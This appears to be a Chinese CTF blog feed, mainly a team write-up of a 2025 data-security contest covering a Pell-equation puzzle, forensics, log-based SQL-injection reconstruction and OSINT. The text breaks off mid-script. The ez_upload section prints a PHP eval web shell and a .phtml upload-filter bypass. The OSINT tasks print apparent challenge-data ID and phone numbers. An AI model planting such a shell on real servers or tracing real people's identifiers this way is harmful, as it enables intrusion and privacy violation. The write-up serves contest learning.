src="https://img.dkdun.cn/v1/2025/12/0328eb1fbe3d1493.png"></p><p>但是这不是 CNVD 吗？？？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">45001</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="溯源排查-6"><a href="#溯源排查-6" class="headerlink" title="溯源排查-6"></a>溯源排查-6</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>找出黑客利用漏洞使用的工具的地址，该工具为开源工具<br></code></pre></td></tr></table></figure><p>直接搜 <code>nacosrce</code> 找到了工具</p><p><img src="https://img.dkdun.cn/v1/2025/12/b3b352a56b747540.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/c0olw/</span>NacosRce&#125;<br></code></pre></td></tr></table></figure><h1 id="关于仿真"><a href="#关于仿真" class="headerlink" title="关于仿真"></a>关于仿真</h1><p>参考的 n0o0b 师傅的文章：<a href="https://www.n0o0b.com/archives/solar-3#%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5-1">https://www.n0o0b.com/archives/solar-3#%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5-1</a> 写得很详细</p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 数字中国数据安全产业积分争夺赛初赛-西区部分题解(团队)</title>
    <link href="/2025/03/30/2025-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E8%A5%BF%E5%8C%BA%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/03/30/2025-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E8%A5%BF%E5%8C%BA%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>差点爆零了TAT，直接被队友带飞了，定榜 17，题量太大了六个小时三波题 2 个人还是忙不过来www</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e9b1c297157f167.png"></p><span id="more"></span><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="1、AS"><a href="#1、AS" class="headerlink" title="1、AS"></a>1、AS</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">题目描述：本题没有考题附件，请忽略附件下载按钮！ 某个高度机密的科研项目，只有通过特定口令验证才能访问服务器。为了保证访问安全，服务器设计了一个复杂认证系统。用户需要根据服务器提供的样例以及参数，进行推导计算，最终得出符合特定条件的数据，将其作为口令输入，输入后获取用户名以及密码，提交<span class="hljs-built_in">md5</span>(username+password)。如username<span class="hljs-selector-attr">[abc]</span>，password<span class="hljs-selector-attr">[123]</span>，最终提交：<span class="hljs-number">93</span>b3b01aa6091522f955f170680eab39。<br></code></pre></td></tr></table></figure><p>nc 连接，查看给出的例子</p><p><img src="https://img.dkdun.cn/v1/2025/12/433339b5cb554f98.png"></p><p>题目给出的等差数列和的条件可以转化为方程，然后通过变形能得到佩尔方程，通过连分数展开法找到最小正整数解 (x1,y1)，然后利用递推公式生成更大的解，直到 n1&#x3D;(x−1)&#x2F;2 &gt;2的 5279 次方，当 n1 和 n2 都大于 2 的 5279 次方时终止循环，所以脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pell</span>(<span class="hljs-params">D</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;通过连分数法找到 Pell 方程 x² - Dy² = 1 的最小解&quot;&quot;&quot;</span><br>    a0 = <span class="hljs-built_in">int</span>(D**<span class="hljs-number">0.5</span>)<br>    <span class="hljs-keyword">if</span> a0 * a0 == D:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># D为完全平方数，无解</span><br><br>    <span class="hljs-comment"># 连分数展开参数初始化</span><br>    m, d, a = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, a0<br>    x_prev, x = <span class="hljs-number">1</span>, a0<br>    y_prev, y = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 计算下一步的连分数参数</span><br>        m = d * a - m<br>        d = (D - m * m) // d<br>        a = (a0 + m) // d<br><br>        <span class="hljs-comment"># 更新x和y的值</span><br>        x_next = a * x + x_prev<br>        y_next = a * y + y_prev<br><br>        <span class="hljs-comment"># 检查是否满足方程</span><br>        <span class="hljs-keyword">if</span> x * x - D * y * y == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> (x, y)<br><br>        <span class="hljs-comment"># 更新迭代变量</span><br>        x_prev, x = x, x_next<br>        y_prev, y = y, y_next<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_solutions</span>(<span class="hljs-params">x1, y1, D, min_exponent=<span class="hljs-number">5279</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成满足 n1 &gt; 2^min_exponent 和 n2 &gt; 2^min_exponent 的解&quot;&quot;&quot;</span><br>    target = <span class="hljs-number">2</span> ** min_exponent<br>    xk, yk = x1, y1<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 计算当前的n1和n2</span><br>        n1 = (xk - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        n2 = yk<br><br>        <span class="hljs-comment"># 检查是否满足条件</span><br>        <span class="hljs-keyword">if</span> n1 &gt; target <span class="hljs-keyword">and</span> n2 &gt; target:<br>            <span class="hljs-keyword">return</span> (n1, n2)<br><br>        <span class="hljs-comment"># 通过递推生成下一个解</span><br>        x_next = x1 * xk + D * y1 * yk<br>        y_next = x1 * yk + y1 * xk<br>        xk, yk = x_next, y_next<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    D = <span class="hljs-number">42232</span>  <span class="hljs-comment"># Pell方程系数</span><br>    min_exponent = <span class="hljs-number">0x149f</span>  <span class="hljs-comment"># 即5279</span><br><br>    <span class="hljs-comment"># 寻找最小解</span><br>    solution = solve_pell(D)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> solution:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无解&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    x1, y1 = solution<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最小解: x=<span class="hljs-subst">&#123;x1&#125;</span>, y=<span class="hljs-subst">&#123;y1&#125;</span> → n1=<span class="hljs-subst">&#123;(x1-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>&#125;</span>, n2=<span class="hljs-subst">&#123;y1&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 生成足够大的解</span><br>    <span class="hljs-keyword">try</span>:<br>        n1, n2 = generate_solutions(x1, y1, D, min_exponent)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n满足条件的解:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n计算被中断。解可能需要指数级时间才能生成。&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d0268cf7d378126c.png"></p><p>拿到用户名和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f3c168918cb3f41.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">ADMIN</span>-<span class="hljs-variable constant_">JM</span><span class="hljs-symbol">:JM001x!</span><br></code></pre></td></tr></table></figure><p>对 <code>ADMIN-JM+JM001x!</code> 进行 md5 加密得到 flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b<span class="hljs-number">7133</span>d<span class="hljs-number">84297</span><span class="hljs-keyword">c</span><span class="hljs-number">307</span>a<span class="hljs-number">92e70</span>d<span class="hljs-number">7727</span>f<span class="hljs-number">55</span>cbc<br></code></pre></td></tr></table></figure><h2 id="3、ez-upload"><a href="#3、ez-upload" class="headerlink" title="3、ez_upload"></a>3、ez_upload</h2><p>此处文件上传可以通过后缀名 <code>.phtml</code> 进行绕过，当然文件内容好像也对 php 进行了过滤，短木马即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bcb828143f86b3f9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/ea800c1998b22048.png"></p><p>得到路径</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">/<span class="hljs-keyword">var</span>/www/rssss4a<br></code></pre></td></tr></table></figure><h1 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h1><h2 id="溯源与取证"><a href="#溯源与取证" class="headerlink" title="溯源与取证"></a>溯源与取证</h2><h3 id="任务-1"><a href="#任务-1" class="headerlink" title="任务 1"></a>任务 1</h3><p>下载附件以后，直接使用 R-STUDIO 进行挂载即可</p><p><img src="https://img.dkdun.cn/v1/2025/12/fff6eb89d16eb130.png"></p><p>然后恢复文件，将恢复的 docx 文档改后缀名为 rar，解压，在 <code>document.xml</code> 中发现 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/2b41e8c447f1ea13.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">b1e9517338f261396511359bce56bf58<br></code></pre></td></tr></table></figure><h3 id="任务-2"><a href="#任务-2" class="headerlink" title="任务 2"></a>任务 2</h3><p>通过查看内存镜像中的 <code>cmdline</code> 项，发现 <code>log</code> 文件可能是 <code>TrueCrypt</code> 加密<br><img src="https://img.dkdun.cn/v1/2025/12/00860ec0e080102e.png"></p><p>直接用 passware 进行解密</p><p><img src="https://img.dkdun.cn/v1/2025/12/87a528fe9365507d.png"></p><p>得到文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/f58741fdd0bb1af9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/5b439ac34f725a4e.png"></p><p>然后成功得到日志</p><p><img src="https://img.dkdun.cn/v1/2025/12/b869b1d6c7c7a37a.png"></p><p>得到 IP</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">114.10.143.92</span><br></code></pre></td></tr></table></figure><h3 id="任务-3"><a href="#任务-3" class="headerlink" title="任务 3"></a>任务 3</h3><p>根据日志 sql 注入内容，写出正则然后写出脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> xpinyin <span class="hljs-keyword">import</span> Pinyin<br><br><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;access.log.1741305600.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    logs = f.readlines()<br><br><span class="hljs-comment"># 初始化数据结构</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;id_card&#x27;</span>: defaultdict(<span class="hljs-built_in">dict</span>),<br>    <span class="hljs-string">&#x27;name&#x27;</span>: defaultdict(<span class="hljs-built_in">dict</span>)<br>&#125;<br><br><span class="hljs-comment"># 优化后的正则模式（合并两种注入类型）</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;select%20(id_card|name)%20from%20info%20limit%20(\d+),1\),(\d+),1\)\)=(\d+).*?&quot; (\d+) (\d+)&#x27;</span><br>)<br><br><span class="hljs-comment"># 统一处理日志</span><br><span class="hljs-keyword">for</span> log <span class="hljs-keyword">in</span> logs:<br>    <span class="hljs-keyword">match</span> = pattern.search(log)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        data_type = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)  <span class="hljs-comment"># id_card/name</span><br>        row = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>))  <span class="hljs-comment"># 记录行号</span><br>        position = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))  <span class="hljs-comment"># 字符位置</span><br>        ascii_val = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>))  <span class="hljs-comment"># ASCII值</span><br>        status_code = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 状态码</span><br>        res_size = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">6</span>)  <span class="hljs-comment"># 响应大小</span><br><br>        <span class="hljs-keyword">if</span> status_code == <span class="hljs-string">&#x27;200&#x27;</span> <span class="hljs-keyword">and</span> res_size == <span class="hljs-string">&#x27;704&#x27;</span>:<br>            <span class="hljs-comment"># 存储有效字符</span><br>            data[data_type][row][position] = <span class="hljs-built_in">chr</span>(ascii_val)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_records</span>(<span class="hljs-params">data_type</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;构建完整数据记录&quot;&quot;&quot;</span><br>    records = []<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(data[data_type].keys()):<br>        positions = data[data_type][row]<br>        max_pos = <span class="hljs-built_in">max</span>(positions.keys()) <span class="hljs-keyword">if</span> positions <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>        record = <span class="hljs-string">&#x27;&#x27;</span>.join([positions.get(i, <span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_pos + <span class="hljs-number">1</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> record:<br>            records.append((row, record))<br>    <span class="hljs-keyword">return</span> records<br><br><br><span class="hljs-comment"># 获取有效数据</span><br>id_card_records = &#123;row: val <span class="hljs-keyword">for</span> row, val <span class="hljs-keyword">in</span> build_records(<span class="hljs-string">&#x27;id_card&#x27;</span>)&#125;<br>name_records = &#123;row: val <span class="hljs-keyword">for</span> row, val <span class="hljs-keyword">in</span> build_records(<span class="hljs-string">&#x27;name&#x27;</span>)&#125;<br><br><span class="hljs-comment"># 合并有效记录（确保id_card和name对应同一行）</span><br>valid_pairs = []<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> id_card_records:<br>    <span class="hljs-keyword">if</span> row <span class="hljs-keyword">in</span> name_records:<br>        valid_pairs.append((id_card_records[row], name_records[row]))<br><br><span class="hljs-comment"># 中文拼音处理</span><br>pinyin_converter = Pinyin()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sort_key</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成拼音排序键&quot;&quot;&quot;</span><br>    initials = pinyin_converter.get_initials(name, <span class="hljs-string">&#x27;&#x27;</span>).upper()  <span class="hljs-comment"># 获取首字母缩写</span><br>    full_pinyin = pinyin_converter.get_pinyin(name, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 获取全拼</span><br>    <span class="hljs-keyword">return</span> (initials, full_pinyin)  <span class="hljs-comment"># 先按首字母排序，再按全拼排序</span><br><br><br><span class="hljs-comment"># 排序处理（多级排序）</span><br>sorted_pairs = <span class="hljs-built_in">sorted</span>(<br>    valid_pairs,<br>    key=<span class="hljs-keyword">lambda</span> x: (get_sort_key(x[<span class="hljs-number">1</span>]), x[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 先按拼音首字母，再按全拼，最后按姓名</span><br>)<br><br><span class="hljs-comment"># 拼接身份证号并计算MD5</span><br>id_card_chain = <span class="hljs-string">&#x27;&#x27;</span>.join([pair[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> pair <span class="hljs-keyword">in</span> sorted_pairs])<br>md5_result = hashlib.md5(id_card_chain.encode()).hexdigest().lower()<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;最终排序的身份证号序列:&quot;</span>)<br><span class="hljs-built_in">print</span>(id_card_chain)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nMD5哈希值:&quot;</span>, md5_result)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a5c3e69e4cf0c10b.png"></p><p>得到最终答案</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">060</span>b534ffb5c4a487be36cca<span class="hljs-number">98165e73</span><br></code></pre></td></tr></table></figure><h2 id="数据社工"><a href="#数据社工" class="headerlink" title="数据社工"></a>数据社工</h2><h3 id="2、张华强的公司名称"><a href="#2、张华强的公司名称" class="headerlink" title="2、张华强的公司名称"></a>2、张华强的公司名称</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[!important]<br><br><span class="hljs-bullet">-</span> 张某喜欢在公司收快递，地址一般为工作地+公司的简写，如<span class="hljs-code">`某某软件园凤凰传媒`</span><br><span class="hljs-bullet">-</span> 参考爬取的企业工商信息，查询公司的正式名称<br></code></pre></td></tr></table></figure><p>在爬取的网页中成功找到了其公司地址</p><p><img src="https://img.dkdun.cn/v1/2025/12/6f486ea4d89ba1e7.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">江苏博林科技有限公司<br></code></pre></td></tr></table></figure><h3 id="3、张华强的手机号"><a href="#3、张华强的手机号" class="headerlink" title="3、张华强的手机号"></a>3、张华强的手机号</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">[!important]</span><br><br><span class="hljs-bullet">- </span>张某为企业的对外联络人<br><span class="hljs-bullet">- </span>假设张华强仅有一个手机号，手机号为11位的明文数字<br></code></pre></td></tr></table></figure><p>同样在网页中得到了手机号</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">13891889377</span><br></code></pre></td></tr></table></figure><h3 id="4、张华强的身份证号"><a href="#4、张华强的身份证号" class="headerlink" title="4、张华强的身份证号"></a>4、张华强的身份证号</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[!important]</span><br><br>- 办理手机号或相关业务需要留存身份证<br></code></pre></td></tr></table></figure><p>在爬取的网页中另外的网页中找到其身份证号码</p><p><img src="https://img.dkdun.cn/v1/2025/12/18f07e64cedfafe6.png"></p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp"><span class="hljs-number">61050119980416547</span><span class="hljs-keyword">X</span><br></code></pre></td></tr></table></figure><h3 id="5、张华强的车牌号"><a href="#5、张华强的车牌号" class="headerlink" title="5、张华强的车牌号"></a>5、张华强的车牌号</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">[!important]<br><br>- 车牌号的格式为：`省的简写+大写字母+空格+<span class="hljs-number">5</span>位字符`，如`苏D PT666`，`苏D`和`PT666`中间存在一个空格<br></code></pre></td></tr></table></figure><p>通过手机号，在停车场泄露的数据中成功找到车牌号，1357.jpg 图片</p><p><img src="https://img.dkdun.cn/v1/2025/12/2afcec28d5a2a437.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">浙<span class="hljs-keyword">B</span> QY318<br></code></pre></td></tr></table></figure><h2 id="数据攻防"><a href="#数据攻防" class="headerlink" title="数据攻防"></a>数据攻防</h2><h3 id="任务-1-1"><a href="#任务-1-1" class="headerlink" title="任务 1"></a>任务 1</h3><p>先把 http 的请求全部 dump 出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/c3ba53e95d2885b3.png"></p><p>用脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;F:\\CTF question\\2025 数字中国创新大赛数字安全赛道数据安全产业积分争夺赛初赛-西区\\数据分析\\数据攻防\\http_get_post_data.txt&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    内容 = f.read()<br><br><span class="hljs-comment"># 定义正则规则</span><br>正则规则s = [<br>    <span class="hljs-string">r&quot;NOT%20like%20&#x27;sqlite_%25&#x27;\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span>,<br>    <span class="hljs-string">r&quot;from%20sqlite_master%20where%20type=&#x27;table&#x27;\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span>,<br>    <span class="hljs-string">r&quot;group_concat\(fl4g_1s_here\)%20from%20password\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span><br>]<br><br><span class="hljs-comment"># 用于存储匹配到的结果</span><br>存储列表 = []<br><br><span class="hljs-comment"># 遍历正则规则，查找匹配项</span><br><span class="hljs-keyword">for</span> 正则规则 <span class="hljs-keyword">in</span> 正则规则s:<br>    pat = re.<span class="hljs-built_in">compile</span>(正则规则)<br>    存储列表.extend(pat.findall(内容))<br><br><span class="hljs-comment"># 输出匹配后的数组内容，方便调试</span><br><span class="hljs-built_in">print</span>(存储列表)<br><br><span class="hljs-comment"># 初始化flag数组</span><br>flag = [<span class="hljs-string">&quot;&quot;</span>] * <span class="hljs-number">100000</span>  <span class="hljs-comment"># 假设长度为100000</span><br><br><span class="hljs-comment"># 处理匹配项</span><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> 存储列表:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t) == <span class="hljs-number">2</span>:<br>        index = <span class="hljs-built_in">int</span>(t[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 获取下标</span><br>        char = t[<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取字符</span><br>        flag[index] = char<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Skipping invalid match: <span 